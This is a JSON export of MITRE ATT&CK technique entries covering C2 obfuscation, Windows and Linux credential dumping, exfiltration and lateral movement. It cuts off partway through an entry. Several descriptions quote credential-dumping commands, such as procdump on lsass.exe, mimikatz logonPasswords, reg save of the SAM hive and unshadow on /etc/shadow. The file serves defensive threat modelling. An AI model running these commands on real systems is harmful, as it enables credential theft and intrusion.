 [
  {
    "id": "attack-pattern--f7c0689c-4dbd-489b-81be-7cb7c7079ade",
    "platform": "linux|macos|windows",
    "tid": "T1001.001",
    "technique": "Junk Data",
    "tactic": "command-and-control",
    "datasources": "network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235",
    "platform": "linux|macos|windows",
    "tid": "T1001.002",
    "technique": "Steganography",
    "tactic": "command-and-control",
    "datasources": "network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc",
    "platform": "linux|windows|macos",
    "tid": "T1001.003",
    "technique": "Protocol Impersonation",
    "tactic": "command-and-control",
    "datasources": "network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90",
    "platform": "windows",
    "tid": "T1003.001",
    "technique": "LSASS Memory",
    "tactic": "credential-access",
    "datasources": "powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct <a href=\"https://attack.mitre.org/tactics/TA0008\">Lateral Movement</a> using <a href=\"https://attack.mitre.org/techniques/T1550\">Use Alternate Authentication Material</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, on the target host use procdump:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->procdump -ma lsass.exe lsass_dump<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Locally, mimikatz can be run using:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->sekurlsa::Minidump lsassdump.dmp<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->sekurlsa::logonPasswords<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Windows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user’s Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages<!-- raw HTML omitted --> and <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages<!-- raw HTML omitted -->. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->The following SSPs can be used to access credentials:<!-- raw HTML omitted --><!-- raw HTML omitted -->* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.<!-- raw HTML omitted -->* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)<!-- raw HTML omitted -->* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.<!-- raw HTML omitted -->* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Graeber 2014",
        "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html",
        "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Blogs Credential Protection",
        "url": "https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/",
        "description": "Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Detecting Attempts to Steal Passwords from Memory",
        "url": "https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea",
        "description": "French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Powersploit",
        "url": "https://github.com/mattifestation/PowerSploit",
        "description": "PowerSploit. (n.d.). Retrieved December 4, 2014.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011",
    "platform": "windows",
    "tid": "T1003.002",
    "technique": "Security Account Manager",
    "tactic": "credential-access",
    "datasources": "powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <!-- raw HTML omitted -->net user<!-- raw HTML omitted --> command. Enumerating the SAM database requires SYSTEM level access.<!-- raw HTML omitted --><!-- raw HTML omitted -->A number of tools can be used to retrieve the SAM file through in-memory techniques:<!-- raw HTML omitted --><!-- raw HTML omitted -->* pwdumpx.exe<!-- raw HTML omitted -->* <a href=\"https://attack.mitre.org/software/S0008\">gsecdump</a><!-- raw HTML omitted -->* <a href=\"https://attack.mitre.org/software/S0002\">Mimikatz</a><!-- raw HTML omitted -->* secretsdump.py<!-- raw HTML omitted --><!-- raw HTML omitted -->Alternatively, the SAM can be extracted from the Registry with Reg:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->reg save HKLM\\sam sam<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->reg save HKLM\\system system<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)<!-- raw HTML omitted --><!-- raw HTML omitted -->Notes: <!-- raw HTML omitted -->* RID 500 account is the local, built-in administrator.<!-- raw HTML omitted -->* RID 501 is the guest account.<!-- raw HTML omitted -->* User accounts start with a RID of 1,000+.<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "GitHub Creddump7",
        "url": "https://github.com/Neohapsis/creddump7",
        "description": "Flathers, R. (2018, February 19). creddump7. Retrieved April 11, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24",
    "platform": "windows",
    "tid": "T1003.003",
    "technique": "NTDS",
    "tactic": "credential-access",
    "datasources": "powershell-logs|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <!-- raw HTML omitted -->%SystemRoot%\\NTDS\\Ntds.dit<!-- raw HTML omitted --> of a domain controller.(Citation: Wikipedia Active Directory)<!-- raw HTML omitted --><!-- raw HTML omitted -->In addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015)<!-- raw HTML omitted --><!-- raw HTML omitted -->The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.<!-- raw HTML omitted --><!-- raw HTML omitted -->* Volume Shadow Copy<!-- raw HTML omitted -->* secretsdump.py<!-- raw HTML omitted -->* Using the in-built Windows tool, ntdsutil.exe<!-- raw HTML omitted -->* Invoke-NinjaCopy<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Active Directory",
        "url": "https://en.wikipedia.org/wiki/Active_Directory",
        "description": "Wikipedia. (2018, March 10). Active Directory. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Metcalf 2015",
        "url": "http://adsecurity.org/?p=1275",
        "description": "Metcalf, S. (2015, January 19). Attackers Can Now Use Mimikatz to Implant Skeleton Key on Domain Controllers & BackDoor Your Active Directory Forest. Retrieved February 3, 2015.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc",
    "platform": "windows",
    "tid": "T1003.004",
    "technique": "LSA Secrets",
    "tactic": "credential-access",
    "datasources": "powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets<!-- raw HTML omitted -->. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/software/S0075\">Reg</a> can be used to extract from the Registry. <a href=\"https://attack.mitre.org/software/S0002\">Mimikatz</a> can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)</p>\n",
    "technique_references": [
      {
        "source_name": "Passcape LSA Secrets",
        "url": "https://www.passcape.com/index.php?section=docsys&cmd=details&id=23",
        "description": "Passcape. (n.d.). Windows LSA secrets. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft AD Admin Tier Model",
        "url": "https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN",
        "description": "Microsoft. (2019, February 14). Active Directory administrative tier model. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Tilbury Windows Credentials",
        "url": "https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf",
        "description": "Chad Tilbury. (2017, August 8). 1Windows Credentials: Attack, Mitigation, Defense. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ired Dumping LSA Secrets",
        "url": "ttps://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets",
        "description": "Mantvydas Baranauskas. (2019, November 16). Dumping LSA Secrets. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Powersploit",
        "url": "https://github.com/mattifestation/PowerSploit",
        "description": "PowerSploit. (n.d.). Retrieved December 4, 2014.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6add2ab5-2711-4e9d-87c8-7a0be8531530",
    "platform": "windows",
    "tid": "T1003.005",
    "technique": "Cached Domain Credentials",
    "tactic": "credential-access",
    "datasources": "powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)<!-- raw HTML omitted --><!-- raw HTML omitted -->On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires <a href=\"https://attack.mitre.org/techniques/T1110/002\">Password Cracking</a> to recover the plaintext password.(Citation: ired mscache)<!-- raw HTML omitted --><!-- raw HTML omitted -->With SYSTEM access, the tools/utilities such as <a href=\"https://attack.mitre.org/software/S0002\">Mimikatz</a>, <a href=\"https://attack.mitre.org/software/S0075\">Reg</a>, and secretsdump.py can be used to extract the cached credentials.<!-- raw HTML omitted --><!-- raw HTML omitted -->Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft - Cached Creds",
        "url": "https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v%3Dws.11)",
        "description": "Microsfot. (2016, August 21). Cached and Stored Credentials Technical Overview. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "PassLib mscache",
        "url": "https://passlib.readthedocs.io/en/stable/lib/passlib.hash.msdcc2.html",
        "description": "Eli Collins. (2016, November 25). Windows' Domain Cached Credentials v2. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ired mscache",
        "url": "https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials",
        "description": "Mantvydas Baranauskas. (2019, November 16). Dumping and Cracking mscash - Cached Domain Credentials. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Powersploit",
        "url": "https://github.com/mattifestation/PowerSploit",
        "description": "PowerSploit. (n.d.). Retrieved December 4, 2014.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163",
    "platform": "windows",
    "tid": "T1003.006",
    "technique": "DCSync",
    "tactic": "credential-access",
    "datasources": "windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller’s application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.<!-- raw HTML omitted --><!-- raw HTML omitted -->Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a <a href=\"https://attack.mitre.org/techniques/T1558/001\">Golden Ticket</a> for use in <a href=\"https://attack.mitre.org/techniques/T1550/003\">Pass the Ticket</a>(Citation: Harmj0y Mimikatz and DCSync) or change an account’s password as noted in <a href=\"https://attack.mitre.org/techniques/T1098\">Account Manipulation</a>.(Citation: InsiderThreat ChangeNTLM July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->DCSync functionality has been included in the “lsadump” module in <a href=\"https://attack.mitre.org/software/S0002\">Mimikatz</a>.(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft DRSR Dec 2017",
        "url": "https://msdn.microsoft.com/library/cc228086.aspx",
        "description": "Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GetNCCChanges",
        "url": "https://msdn.microsoft.com/library/dd207691.aspx",
        "description": "Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Samba DRSUAPI",
        "url": "https://wiki.samba.org/index.php/DRSUAPI",
        "description": "SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wine API samlib.dll",
        "url": "https://source.winehq.org/WineAPI/samlib.html",
        "description": "Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity Mimikatz DCSync",
        "url": "https://adsecurity.org/?p=1729",
        "description": "Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Mimikatz and DCSync",
        "url": "http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",
        "description": "Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved August 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "InsiderThreat ChangeNTLM July 2017",
        "url": "https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM",
        "description": "Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Mimikatz lsadump Module",
        "url": "https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump",
        "description": "Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft NRPC Dec 2017",
        "url": "https://msdn.microsoft.com/library/cc237008.aspx",
        "description": "Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SAMR",
        "url": "https://msdn.microsoft.com/library/cc245496.aspx",
        "description": "Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "AdSecurity DCSync Sept 2015",
        "url": "https://adsecurity.org/?p=1729",
        "description": "Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y DCSync Sept 2015",
        "url": "http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",
        "description": "Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3120b9fa-23b8-4500-ae73-09494f607b7d",
    "platform": "linux",
    "tid": "T1003.007",
    "technique": "Proc Filesystem",
    "tactic": "credential-access",
    "datasources": "process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may gather credentials from information stored in the Proc filesystem or <!-- raw HTML omitted -->/proc<!-- raw HTML omitted -->. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.<!-- raw HTML omitted --><!-- raw HTML omitted -->This functionality has been implemented in the MimiPenguin(Citation: MimiPenguin GitHub May 2017), an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.</p>\n",
    "technique_references": [
      {
        "source_name": "MimiPenguin GitHub May 2017",
        "url": "https://github.com/huntergregal/mimipenguin",
        "description": "Gregal, H. (2017, May 12). MimiPenguin. Retrieved December 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4",
    "platform": "linux",
    "tid": "T1003.008",
    "technique": "/etc/passwd and /etc/shadow",
    "tactic": "credential-access",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to dump the contents of <!-- raw HTML omitted -->/etc/passwd<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/etc/shadow<!-- raw HTML omitted --> to enable offline password cracking. Most modern Linux operating systems use a combination of <!-- raw HTML omitted -->/etc/passwd<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/etc/shadow<!-- raw HTML omitted --> to store user account information including password hashes in <!-- raw HTML omitted -->/etc/shadow<!-- raw HTML omitted -->. By default, <!-- raw HTML omitted -->/etc/shadow<!-- raw HTML omitted --> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)<!-- raw HTML omitted --><!-- raw HTML omitted -->The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <!-- raw HTML omitted --># /usr/bin/unshadow /etc/passwd /etc/shadow &gt; /tmp/crack.password.db<!-- raw HTML omitted --><!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Linux Password and Shadow File Formats",
        "url": "https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html",
        "description": "The Linux Documentation Project. (n.d.). Linux Password and Shadow File Formats. Retrieved February 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "nixCraft - John the Ripper",
        "url": "https://www.cyberciti.biz/faq/unix-linux-password-cracking-john-the-ripper/",
        "description": "Vivek Gite. (2014, September 17). Linux Password Cracking: Explain unshadow and john Commands (John the Ripper Tool). Retrieved February 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
    "platform": "linux|macos|windows",
    "tid": "T1011.001",
    "technique": "Exfiltration Over Bluetooth",
    "tactic": "exfiltration",
    "datasources": "process-monitoring|user-interface",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an attacker may opt to exfiltrate data using a Bluetooth communication channel.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
    "platform": "network",
    "tid": "T1020.001",
    "technique": "Traffic Duplication",
    "tactic": "exfiltration",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised network infrastructure.  Traffic mirroring is a native feature for some network devices and used for network analysis and may be configured to duplicate traffic and forward to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring) (Citation: Juniper Traffic Mirroring)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other network infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through <a href=\"https://attack.mitre.org/techniques/T1542/004\">ROMMONkit</a> or <a href=\"https://attack.mitre.org/techniques/T1601/001\">Patch System Image</a>.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) Adversaries may use traffic duplication in conjunction with <a href=\"https://attack.mitre.org/techniques/T1040\">Network Sniffing</a>, <a href=\"https://attack.mitre.org/techniques/T1056\">Input Capture</a>, or <a href=\"https://attack.mitre.org/techniques/T1557\">Man-in-the-Middle</a> depending on the goals and objectives of the adversary.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/117.html",
        "description": "none",
        "external_id": "CAPEC-117"
      },
      {
        "source_name": "Cisco Traffic Mirroring",
        "url": "https://www.cisco.com/c/en/us/td/docs/routers/crs/software/crs_r5-1/interfaces/configuration/guide/hc51xcrsbook/hc51span.html",
        "description": "Cisco. (n.d.). Cisco IOS XR Interface and Hardware Component Configuration Guide for the Cisco CRS Router, Release 5.1.x. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Juniper Traffic Mirroring",
        "url": "https://www.juniper.net/documentation/en_US/junos/topics/concept/port-mirroring-ex-series.html",
        "description": "Juniper. (n.d.). Understanding Port Mirroring on EX2200, EX3200, EX3300, EX4200, EX4500, EX4550, EX6200, and EX8200 Series Switches. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT-TA18-106A",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
        "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf",
    "platform": "windows",
    "tid": "T1021.001",
    "technique": "Remote Desktop Protocol",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs|netflow-enclave-netflow|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
